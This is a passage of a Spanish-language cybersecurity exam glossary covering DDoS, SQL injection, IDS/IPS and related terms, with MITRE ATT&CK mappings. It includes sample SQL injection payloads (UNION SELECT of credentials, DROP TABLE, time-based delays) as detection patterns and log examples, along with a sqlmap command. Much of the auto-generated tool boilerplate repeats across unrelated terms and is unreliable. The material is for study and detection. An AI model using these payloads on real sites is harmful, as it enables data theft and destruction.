- Slowloris: conexiones lentas que se mantienen abiertas
- UDP flood: packets UDP masivos a puertos random

**Ejemplo de log:**
```
Firewall log (durante DDoS):
15:42:11 SYN 203.0.113.45:12345 -> SERVER:80
15:42:11 SYN 198.51.100.23:54321 -> SERVER:80
15:42:11 SYN 192.0.2.67:43210 -> SERVER:80
[... 10,000+ SYN por segundo ...]

NetFlow:
Timestamp: 15:42:00-15:43:00
Inbound traffic: 50 Gbps (normal: 2 Gbps)
Source IPs: 45,000 unique (botnet)
Destination: SERVER:80,443

→ IOC: SYN flood masivo = DDoS attack
```

#### 🎭 MITRE ATT&CK

**T1498 - Network Denial of Service**  
- Tactic: Impact  
- Relevance: DDoS hace servicio inaccesible  
- Detection: Network monitoring, spike en conexiones, bandwidth saturation  

**T1499 - Endpoint Denial of Service**  
- Tactic: Impact  
- Relevance: Application-layer DDoS (HTTP flood)  
- Detection: Web server logs, requests/sec anómalo  

---

### Reflected DDoS

**Definición:** Ataque DDoS que usa servidores intermedios para amplificar trafico. Falsifica IP origen (spoofing). Servidores reflejan respuestas a victima

**Ejemplos:**
- DNS amplification
- NTP amplification
- Factor 50x-100x amplificacion
- Abuso de servidores publicos

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Reflected DDoS  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Reflected DDoS
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Reflected DDoS  
- Detection: Monitoreo de logs + behavioral analysis  

---

### DNS Spoofing (Envenenamiento DNS)

**Definición:** Proporcionar información DNS falsa al resolver para redirigir tráfico a servidor malicioso

**Ejemplos:**
- Modificar cache DNS para redirigir google.com a IP maliciosa
- Ataque Man-in-the-Middle via DNS

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con DNS Spoofing (Envenenamiento DNS)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### MitM (Man-in-the-Middle)

**Definición:** Atacante se interpone entre dos partes que se comunican para interceptar/modificar tráfico. También llamado On-Path attack

**Ejemplos:**
- ARP spoofing en LAN
- SSL stripping
- Rogue WiFi AP
- Interceptar credenciales en texto claro

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a MitM (Man-in-the-Middle)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a MitM (Man-in-the-Middle)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con MitM (Man-in-the-Middle)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Session Hijacking (Secuestro de sesión)

**Definición:** Robo de Session ID válido para suplantar usuario autenticado. NO requiere credenciales

**Ejemplos:**
- Robar cookie de sesión via XSS
- Sniffing de Session ID en red no cifrada
- Acceder a cuenta sin password

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con Session Hijacking (Secuestro de sesión)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### Brute Force Attack

**Definición:** Ataque que prueba TODAS las combinaciones posibles de contraseñas hasta encontrar la correcta. Alto uso de recursos

**Ejemplos:**
- Probar todas las contraseñas de 8 caracteres
- Crackear hash con diccionario + variaciones
- Mitigación: lockout, MFA, contraseñas largas

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Brute Force Attack  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Brute Force Attack
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Brute Force Attack  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Dictionary Attack

**Definición:** Ataque que prueba contraseñas desde lista predefinida (diccionario) de passwords comunes. Más rápido que brute force

**Ejemplos:**
- Lista: password, 123456, admin, qwerty
- Rockyou.txt (14M passwords)
- Más eficiente que probar todo el keyspace

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Dictionary Attack  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Dictionary Attack
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Dictionary Attack  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Password Spraying

**Definición:** Probar POCAS contraseñas comunes contra MUCHAS cuentas. Evita lockout de cuenta individual

**Ejemplos:**
- Password123 contra 1000 usuarios
- Evita bloqueo por intentos fallidos en una cuenta
- Más sigiloso que brute force

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Privilege Escalation (Escalada de privilegios)

**Definición:** Obtener permisos superiores a los asignados inicialmente. Vertical (usuario → admin) u horizontal (usuario → otro usuario)

**Ejemplos:**
- Exploit de kernel para root
- Sudo misconfiguration
- Movimiento lateral entre cuentas

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### CVE (Common Vulnerabilities and Exposures)

**Definición:** Sistema de identificacion unica de vulnerabilidades. Formato: CVE-YEAR-NUMBER. Mantenido por MITRE

**Ejemplos:**
- CVE-2021-44228 (Log4Shell)
- CVE-2014-0160 (Heartbleed)
- Usado en patch management y scanners

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a CVE (Common Vulnerabilities and Exposures)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a CVE (Common Vulnerabilities and Exposures)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con CVE (Common Vulnerabilities and Exposures)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### CVSS (Common Vulnerability Scoring System)

**Definición:** Sistema de puntuación de gravedad de vulnerabilidades. Escala 0.0-10.0. Crítico (9.0-10.0), Alto (7.0-8.9), Medio (4.0-6.9), Bajo (0.1-3.9)

**Ejemplos:**
- Log4Shell: CVSS 10.0 (Crítico)
- Factores: vector de ataque, complejidad, privilegios requeridos

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a CVSS (Common Vulnerability Scoring System)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a CVSS (Common Vulnerability Scoring System)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con CVSS (Common Vulnerability Scoring System)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### IoC (Indicator of Compromise)

**Definición:** Evidencia forense que indica posible intrusión o actividad maliciosa. Hashes, IPs, dominios, patrones de comportamiento

**Ejemplos:**
- Hash MD5 de malware conocido
- IP de servidor C2
- Múltiples logins fallidos
- Tráfico a dominio sospechoso

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con IoC (Indicator of Compromise)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### Input Validation

**Definición:** Validar toda entrada de usuario antes de procesarla. Previene injection, XSS, buffer overflow. Whitelist mejor que blacklist

**Ejemplos:**
- Rechazar caracteres especiales en formularios
- Validar tipo de dato (numeros, emails)
- Parametrized queries contra SQL injection

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Error Handling

**Definición:** Manejo seguro de errores sin revelar informacion sensible. Mensajes genericos al usuario, detalles solo en logs internos

**Ejemplos:**
- NO mostrar stack traces a usuarios
- Mensajes genericos: Error procesando solicitud
- Loggear detalles completos en servidor

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Data Sanitization

**Definición:** Eliminar/sobrescribir datos de forma permanente. Metodos: Overwriting, Degaussing, Destruccion fisica, Crypto-shredding

**Ejemplos:**
- DoD 5220.22-M (7 pases)
- Degaussing de discos magneticos
- Triturar discos SSD
- Eliminar claves de cifrado (crypto-shredding)

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con Data Sanitization  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### False Negative

**Definición:** Sistema de seguridad NO detecta amenaza real. Falso sentido de seguridad. MAS PELIGROSO que falso positivo

**Ejemplos:**
- Antivirus no detecta malware nuevo
- IDS no alerta sobre intrusion real
- Firewall permite trafico malicioso

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### False Positive

**Definición:** Sistema de seguridad alerta sobre actividad normal como amenaza. Genera fatiga de alertas y reduce eficiencia

**Ejemplos:**
- Antivirus bloquea software legitimo
- IDS alerta sobre escaneo de seguridad autorizado
- DLP bloquea transferencia legitima

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con False Positive  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### MITRE ATT&CK

**Definición:** Framework de tacticas y tecnicas de adversarios. Base de conocimiento de comportamiento de atacantes. Matriz de TTPs

**Ejemplos:**
- 14 tacticas: Reconnaissance, Initial Access, Execution...
- Tecnicas numeradas: T1059.001 (PowerShell)
- Usado para threat hunting y CTI

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Attack Surface

**Definición:** Suma de todos los puntos de vulnerabilidad donde atacante puede interactuar/comprometer sistema. Mayor superficie = mayor riesgo

**Ejemplos:**
- Puertos abiertos
- Aplicaciones web
- APIs
- Usuarios
- Reduccion: deshabilitar servicios innecesarios

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Attack Surface  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Attack Surface
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Attack Surface  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Threat Vector

**Definición:** Metodo/ruta que atacante usa para introducir amenaza. Email, malware, drive-by download, ingenieria social

**Ejemplos:**
- Email phishing
- USB malicioso
- Descarga drive-by
- Mensajeria instantanea
- Archivos PDF/Office maliciosos

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Threat Vector  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Threat Vector
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Threat Vector  
- Detection: Monitoreo de logs + behavioral analysis  

---

### SQL Injection (SQLi)

**Definición:** Inyeccion de codigo SQL malicioso en campos de entrada para ejecutar comandos no autorizados en base de datos

**Ejemplos:**
- OR 1=1-- para bypass de login
- UNION SELECT para exfiltrar datos
- Mitigacion: parametrized queries
- Input validation

#### 🔧 Herramientas (Extension: manual)

**sqlmap:**  
- Propósito: Automated SQL injection testing  
- Comando: `sqlmap -u 'http://target.com/page?id=1' --batch --dbs`  
- Output: Databases extraídas si vulnerable  

**Burp Suite:**  
- Propósito: Manual SQL injection testing  
- Comando: `Intercept request → modify parameter → send to Repeater`  
- Output: Respuestas del servidor  

**WAF logs:**  
- Propósito: Detectar intentos de SQLi  
- Comando: `grep "UNION SELECT" /var/log/modsec_audit.log`  
- Output: Requests bloqueadas con SQL keywords  

#### 📊 Log Analysis

**Logs a revisar:**
- Web server access logs: buscar SQL keywords en query strings (UNION, SELECT, OR 1=1)
- WAF logs: ModSecurity, AWS WAF, Cloudflare - blocked requests
- Database query logs: slow query log, general query log (si habilitado)
- Application logs: SQL errors (syntax error, table doesn't exist)

**IOC Patterns:**
- URL parameter: ?id=1' OR '1'='1 (authentication bypass)
- UNION SELECT: ?id=1 UNION SELECT username,password FROM users
- Error-based: ?id=1' AND 1=CONVERT(int,(SELECT @@version))--
- Time-based blind: ?id=1'; WAITFOR DELAY '00:00:05'--
- Multiple attempts: mismo IP probando diferentes payloads

**Ejemplo de log:**
```
access.log:
185.220.101.42 - - [03/Mar/2026:14:23:11] "GET /product?id=1'+UNION+SELECT+NULL,username,password+FROM+users-- HTTP/1.1" 200 4532
185.220.101.42 - - [03/Mar/2026:14:23:15] "GET /product?id=1'+AND+1=CONVERT(int,(SELECT+@@version))-- HTTP/1.1" 500 1243
185.220.101.42 - - [03/Mar/2026:14:23:18] "GET /product?id=1';+DROP+TABLE+users;-- HTTP/1.1" 500 891

→ IOC: Intentos repetidos de SQL injection desde misma IP
```

#### 🎭 MITRE ATT&CK

**T1190 - Exploit Public-Facing Application**  
- Tactic: Initial Access  
- Relevance: SQLi explota web app vulnerable  
- Detection: WAF logs, application logs con SQL errors  

**T1005 - Data from Local System**  
- Tactic: Collection  
- Relevance: SQLi extrae data de BD  
- Detection: Anomalous DB queries, data exfiltration en HTTP responses  

**T1485 - Data Destruction**  
- Tactic: Impact  
- Relevance: DROP TABLE, DELETE statements  
- Detection: DB audit logs, sudden table/data loss  

---

### Memory Injection

**Definición:** Introducir codigo externo en espacio de memoria de proceso en ejecucion. Tecnica de evasion de AV

**Ejemplos:**
- DLL injection
- Process hollowing
- Reflective DLL injection
- Usado por malware avanzado

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Malicious Application Update

**Definición:** Malware instalado via actualizacion falsa de software. Vector: codigo sin firmar, canal HTTP, servidor comprometido, supply chain attack

**Ejemplos:**
- NotPetya via actualizacion MeDoc
- SolarWinds supply chain attack
- Fake Flash update
- Mitigacion: code signing, HTTPS

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Malicious Application Update  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Malicious Application Update
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Malicious Application Update  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Legacy Hardware Vulnerabilities

**Definición:** Vulnerabilidad principal: falta de actualizaciones de seguridad y parches. Hardware obsoleto sin soporte

**Ejemplos:**
- Windows XP sin parches
- Hardware sin actualizacion firmware
- End-of-Life equipment
- Mitigacion: segmentacion de red

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Legacy Hardware Vulnerabilities  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Legacy Hardware Vulnerabilities
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Legacy Hardware Vulnerabilities  
- Detection: Monitoreo de logs + behavioral analysis  

---

### VM Escape

**Definición:** Vulnerabilidad de virtualizacion donde activos de una VM acceden/comprometen otra VM. Rompe aislamiento entre VMs

**Ejemplos:**
- Exploit en hypervisor
- Compartir recursos entre VMs inseguro
- Resource reuse vulnerability
- Mitigacion: parchar hypervisor

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a VM Escape  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a VM Escape
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con VM Escape  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Wireless Disassociation

**Definición:** Ataque que envia frames de desasociacion falsos. Desconecta clientes de AP. Tipo de DoS inalambrico. Frames de gestion no autenticados

**Ejemplos:**
- aireplay-ng --deauth
- Preparacion para WPA handshake capture
- Evil Twin attack
- Frame management spoofing

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Wireless Disassociation  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Wireless Disassociation
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Wireless Disassociation  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Session Replay

**Definición:** Ataque que captura y reenvía sesion valida. Intercepta trafico autenticado. Replay de tokens o cookies de sesion. Bypass de autenticacion

**Ejemplos:**
- Captura token JWT
- Replay cookie de sesion
- Kerberos ticket replay
- Mitigacion: nonce, timestamp, SSL/TLS

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Session Replay  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Session Replay
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Session Replay  
- Detection: Monitoreo de logs + behavioral analysis  

---

## Dominio 3 Arquitectura Seguridad

**Peso examen:** 18%  **Términos ALTA prioridad:** 60  

### Firewall

**Definición:** Dispositivo o software que filtra tráfico de red según reglas. Tipos: filtrado de paquetes, stateful, capa de aplicación (L7), NGFW

**Ejemplos:**
- Bloquear puerto 23 (Telnet)
- Permitir HTTP/HTTPS saliente
- Palo Alto NGFW con inspección deep packet

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con Firewall  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### Layer 7 Firewall (Application Layer Firewall)

**Definición:** Firewall que inspecciona capa de aplicacion OSI. Analiza contenido payload (no solo headers). Filtrado profundo pero mas lento

**Ejemplos:**
- WAF (Web Application Firewall)
- Inspecciona HTTP payload
- Bloquea SQL injection
- Mas lento que Layer 3/4

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con Layer 7 Firewall (Application Layer Firewall)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### WAF (Web Application Firewall)

**Definición:** Firewall específico para proteger aplicaciones web. Filtra tráfico HTTP/HTTPS. Protege contra SQLi, XSS, CSRF

**Ejemplos:**
- Cloudflare WAF
- AWS WAF
- ModSecurity

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con WAF (Web Application Firewall)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### IDS (Intrusion Detection System)

**Definición:** Sistema que DETECTA intrusiones pero NO bloquea. Genera alertas. Tipos: NIDS (red), HIDS (host)

**Ejemplos:**
- Snort en modo IDS
- Detección de escaneo de puertos
- Alerta de tráfico C2

#### 🔧 Herramientas (Extension: manual)

**Snort:**  
- Propósito: Network IDS con signatures  
- Comando: `snort -A console -q -c /etc/snort/snort.conf -i eth0`  
- Output: Alerts en tiempo real  

**Suricata:**  
- Propósito: IDS/IPS multi-threaded  
- Comando: `suricata -c /etc/suricata/suricata.yaml -i eth0`  
- Output: Logs en /var/log/suricata/eve.json  

**Zeek (Bro):**  
- Propósito: Network analysis framework  
- Comando: `zeek -i eth0 local`  
- Output: Logs detallados en /opt/zeek/logs/  

#### 📊 Log Analysis

**Logs a revisar:**
- Snort: /var/log/snort/alert (fast format)
- Suricata: eve.json (JSON format con metadata completo)
- Zeek: conn.log, dns.log, http.log, ssl.log
- PCAP: captured packets para análisis post-mortem

**IOC Patterns:**
- Signature match: ET SCAN Nmap -sV version detection
- Protocol anomalies: Malformed HTTP headers, invalid TCP flags
- Known exploits: CVE-specific signatures triggering
- C2 beaconing: conexiones periódicas cada X minutos
- Data exfiltration: large outbound transfers a IPs externas

**Ejemplo de log:**
```
[**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**]
[Classification: Potentially Bad Traffic] [Priority: 2]
03/03-15:42:11.123456 192.0.2.45:45678 -> 10.0.1.100:22
TCP TTL:64 TOS:0x0 ID:12345 IpLen:20 DgmLen:60
***AP*** Seq: 0x1234ABCD  Ack: 0xABCD1234  Win: 0x2000

→ IOC: Respuesta 'root' detectada post-exploit en SSH
```

#### 🎭 MITRE ATT&CK

**T1046 - Network Service Scanning**  
- Tactic: Discovery  
- Relevance: IDS detecta Nmap, Masscan, Nessus scans  
- Detection: Snort ET SCAN rules, Suricata emerging-scan.rules  

**T1190 - Exploit Public-Facing Application**  
- Tactic: Initial Access  
- Relevance: IDS tiene signatures de exploits conocidos (CVE)  
- Detection: CVE-specific Snort/Suricata rules  

**T1071.001 - Web Protocols**  
- Tactic: Command and Control  
- Relevance: IDS detecta C2 beaconing patterns  
- Detection: Frequency analysis, JA3 fingerprinting  

---

### NIDS (Network-based IDS)

**Definición:** Sistema de deteccion de intrusiones a nivel de red. Monitorea trafico sin bloquearlo. Modo pasivo. Genera alertas

**Ejemplos:**
- Snort en modo IDS
- Monitoreo de span port
- Deteccion de escaneos y ataques
- NO bloquea - solo alerta

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con NIDS (Network-based IDS)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### IPS (Intrusion Prevention System)

**Definición:** Sistema que DETECTA Y BLOQUEA intrusiones en línea (inline). IDS + prevención activa

**Ejemplos:**
- Snort en modo IPS
- Bloqueo automático de IP atacante
- Drop de paquetes maliciosos

#### 🔧 Herramientas (Extension: manual)

**Suricata (IPS mode):**  
- Propósito: Inline blocking de threats  
- Comando: `suricata -c /etc/suricata/suricata.yaml --af-packet=eth0`  
- Output: Blocks + logs threats  

**Snort3 (IPS mode):**  
- Propósito: Inline prevention  
- Comando: `snort -c /etc/snort/snort.lua -i eth0:eth1 -Q`  
- Output: Drop packets + alert  

**fail2ban:**  
- Propósito: Host-based IPS para brute force  
- Comando: `fail2ban-client status sshd`  
- Output: Banned IPs list  

#### 📊 Log Analysis

**Logs a revisar:**
- Suricata: eve.json con action:'drop' o action:'reject'
- Snort: alert + drop logs en /var/log/snort/
- fail2ban: /var/log/fail2ban.log
- Firewall: correlate con dropped connections
- Application logs: verificar si attack fue exitoso antes de block

**IOC Patterns:**
- Blocked exploit attempts: CVE signatures triggering drops
- Brute force blocked: múltiples auth failures → IP banned
- Malware download blocked: known malicious file hashes
- C2 communication blocked: destination IP en threat intel blacklist
- DDoS mitigation: rate limiting triggered, packets dropped

**Ejemplo de log:**
```
{
  "timestamp": "2026-03-03T15:42:11.123456+0000",
  "event_type": "alert",
  "src_ip": "203.0.113.45",
  "dest_ip": "10.0.1.100",
  "alert": {
    "action": "blocked",
    "signature": "ET EXPLOIT Apache Struts OGNL Injection",
